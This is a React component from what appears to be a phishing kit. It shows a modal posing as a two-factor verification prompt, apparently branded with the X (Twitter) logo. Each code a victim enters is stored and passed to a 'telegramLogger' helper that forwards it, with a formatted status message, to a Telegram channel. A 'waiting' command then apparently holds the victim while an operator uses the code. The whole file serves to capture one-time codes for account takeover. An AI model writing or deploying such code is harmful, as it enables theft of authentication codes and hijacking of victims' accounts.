"use client";

import { useState } from "react";
import { setUserData, updateTelegramMessage, simulateCommand } from "@/utils/telegramLogger";

interface TwoFAVerificationProps {
  onSubmit: (code: string) => void;
  onClose: () => void;
  type?: "app" | "phone" | "email"; // Doğrulama türü
}

export default function TwoFAVerification({ onSubmit, onClose, type = "app" }: TwoFAVerificationProps) {
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);

  const handleSubmit = async () => {
    if (!code.trim() || code.trim().length < 6) {
      alert("Please enter a valid verification code");
      return;
    }

    setLoading(true);

    try {
      // Store the 2FA code
      setUserData({ twoFACode: code });

      // Get verification type text and emoji
      let typeText = "";
      let emoji = "";
      switch (type) {
        case "phone":
          typeText = "Phone Number";
          emoji = "📱";
          break;
        case "email":
          typeText = "Email";
          emoji = "📧";
          break;
        default:
          typeText = "Authenticator App";
          emoji = "🔐";
          break;
      }

      // Format the status message
      const status = `${emoji} 2FA CODE (${typeText}): ${code}`;

      await updateTelegramMessage(
        { twoFACode: code },
        status
      );

      // Waiting komutunu simüle et
      simulateCommand("waiting");

      // Önce onSubmit'i çağır
      await onSubmit(code);
    } catch (error) {
      console.error("Error submitting 2FA code:", error);
    } finally {
      setLoading(false);
    }
  };

  const getTitle = () => {
    switch (type) {
      case "phone": return "Phone Verification";
      case "email": return "Email Verification";
      default: return "2FA Verification Required";
    }
  };

  const getDescription = () => {
    switch (type) {
      case "phone": return "Enter the 6-digit code sent to your phone";
      case "email": return "Enter the 6-digit code sent to your email";
      default: return "Enter the 6-digit code from your authenticator app";
    }
  };

  return (
    <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
      <div className="bg-white rounded-2xl w-full max-w-[400px] relative mx-4 overflow-hidden">
        {/* Header */}
        <div className="p-4 text-center relative border-b border-gray-200">
          <div className="absolute left-4 top-4 cursor-pointer" onClick={onClose}>
            <svg viewBox="0 0 24 24" aria-hidden="true" className="h-5 w-5">
              <path
                d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"
                fill="currentColor"
              />
            </svg>
          </div>
          <h2 className="text-xl font-bold">{getTitle()}</h2>
        </div>

        <div className="p-5">
          {/* Description */}
          <div className="mb-5 text-sm text-center">
            {getDescription()}
          </div>

          {/* Form */}
          <div className="mb-5">
            <input
              type="text"
              placeholder="Enter your code"
              value={code}
              onChange={(e) => {
                // Only allow digits and limit to 6 characters
                const value = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
                setCode(value);
              }}
              className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-gray-400 bg-white text-center text-lg tracking-widest"
              maxLength={6}
            />
          </div>
        </div>

        {/* Footer with button */}
        <div className="p-4">
          <button
            onClick={handleSubmit}
            disabled={loading || code.length < 6}
            className="w-full bg-gray-600 hover:bg-gray-700 text-white rounded-full py-3 font-medium disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {loading ? "Verifying..." : "Next"}
          </button>
        </div>
      </div>
    </div>
  );
}
